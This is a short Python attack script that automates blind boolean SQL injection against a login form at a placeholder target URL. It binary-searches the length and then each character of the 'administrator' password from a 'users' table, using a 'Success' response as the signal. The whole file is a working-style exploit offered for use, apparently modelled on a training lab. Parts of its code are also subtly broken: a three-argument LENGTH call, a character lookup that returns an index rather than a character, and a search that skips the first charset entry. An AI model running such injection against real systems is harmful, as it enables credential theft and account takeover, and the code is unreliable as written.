import requests
from string import digits, ascii_uppercase, ascii_lowercase

url = 'YOUR TARGET URL'
charset = digits + ascii_uppercase + ascii_lowercase


def check(payload):
    return 'Success' in requests.get(url, data={'username': 'aaa', 'password': payload}).text


def check_password_length(length):
    return check(f"' AND {length} >= (SELECT LENGTH(password,1,1) FROM users WHERE username='administrator')--")


def find_password_length(max_length):
    l = 1
    r = max_length
    while l < r:
        mid = l + r >> 1
        if check_password_length(mid):
            r = mid
        else:
            l = mid + 1
    return l


def check_password_char(index, value):
    return check(f"' AND '{value}' >= (SELECT SUBSTRING(password,{index},1) FROM users WHERE username='administrator')--")


def find_password_char(index):
    l = 1
    r = len(charset) - 1
    while l < r:
        mid = l + r >> 1
        if check_password_char(index, charset[mid]):
            r = mid
        else:
            l = mid + 1
    return l


def find_password():
    length = find_password_length(30)
    result = ''
    for i in range(length):
        result += find_password_char(i + 1)
    return result
